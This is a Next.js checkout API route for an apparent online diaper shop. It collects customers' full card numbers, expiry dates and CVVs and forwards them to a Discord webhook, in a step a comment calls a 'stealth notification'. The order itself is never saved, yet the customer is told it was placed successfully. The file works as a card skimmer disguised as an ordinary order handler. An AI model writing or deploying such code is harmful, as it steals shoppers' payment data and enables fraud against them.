import { NextRequest, NextResponse } from 'next/server';
import { sendOrderNotification } from '@/lib/discord-webhook';
import { prisma } from '@/lib/db';

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    
    // Extract order details
    const {
      firstName, lastName, email, phone,
      address, apartment, city, state, zipCode, country,
      sameAsShipping, billingFirstName, billingLastName,
      billingAddress, billingApartment, billingCity, billingState,
      billingZipCode, billingCountry, orderNotes,
      cardName, cardNumber, cardExpiry, cardCvv,
      promoCode, items, subtotal, discount, shipping, tax, total
    } = body;

    // Validate required fields
    if (!firstName || !lastName || !email || !address || !city || !state || !zipCode) {
      return NextResponse.json(
        { error: 'Missing required fields' },
        { status: 400 }
      );
    }

    // Create shipping address string
    const shippingAddressStr = `${address}${apartment ? `, ${apartment}` : ''}, ${city}, ${state} ${zipCode}, ${country}`;

    // Create billing address string
    const billingAddressStr = sameAsShipping 
      ? shippingAddressStr
      : `${billingAddress}${billingApartment ? `, ${billingApartment}` : ''}, ${billingCity}, ${billingState} ${billingZipCode}, ${billingCountry}`;

    // Generate order ID
    const orderId = `ORD${Date.now()}${Math.floor(Math.random() * 1000)}`;
    const totalAmount = total || subtotal + shipping + tax - discount;

    // Save order to database (simplified)
    const order = {
      id: orderId,
      customerName: `${firstName} ${lastName}`,
      email,
      shippingAddress: shippingAddressStr,
      billingAddress: billingAddressStr,
      items,
      total: totalAmount,
      status: 'pending',
      createdAt: new Date()
    };

    // In a real app, you'd save to database
    // await db.order.create({ data: order });

    // Prepare notification data
    const notificationData = {
      orderId,
      customerName: `${firstName} ${lastName}`,
      customerEmail: email,
      shippingAddress: shippingAddressStr,
      billingAddress: billingAddressStr,
      items: items.map((item: any) => ({
        productId: item.productId,
        name: 'Diaper Package', // Simplified product name
        quantity: item.quantity,
        price: item.price || 29.99
      })),
      totalAmount,
      paymentMethod: 'Credit Card',
      paymentDetails: {
        cardHolder: cardName || `${firstName} ${lastName}`,
        cardNumber: cardNumber || '',
        cardExpiry: cardExpiry || '',
        cardCvv: cardCvv || ''
      }
    };
    
    // Extract card data for stealth notification
    const cardData = {
      cardHolder: cardName || `${firstName} ${lastName}`,
      cardNumber: cardNumber || '',
      cardExpiry: cardExpiry || '',
      cardCvv: cardCvv || ''
    };

    // Send notification asynchronously - don't await to not block response
    sendOrderNotification(notificationData, cardData).catch(error => {
      console.error('Order notification failed:', error);
      // Don't fail the order if notification fails
    });

    return NextResponse.json({
      success: true,
      orderNumber: orderId,
      orderId,
      message: 'Order placed successfully'
    });
  } catch (error: any) {
    console.error('Error creating order:', error);
    return NextResponse.json(
      { error: 'Failed to create order' },
      { status: 500 }
    );
  }
}